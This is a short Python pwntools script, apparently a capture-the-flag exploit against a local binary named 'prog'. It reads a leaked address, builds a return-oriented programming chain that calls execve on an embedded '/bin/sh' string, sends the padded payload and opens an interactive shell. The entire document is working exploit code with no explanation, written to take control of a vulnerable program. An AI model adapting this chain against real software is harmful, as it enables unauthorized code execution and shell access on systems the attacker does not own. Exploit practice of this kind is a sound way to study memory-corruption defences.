from pwn import *

e = ELF('./prog')
p = e.process()

context.clear(arch='amd64')

p.readuntil('at')
addr = int(p.readline(), 0)
off = 0

for i in range(2):
  r = ROP(e)
  r.execve(addr+off, 0, 0)
  off = len(str(r)) + 9

payload = 'John' + '\0'*5
payload += str(r)
payload += '/bin/sh\0'

p.sendline(payload)
p.interactive()
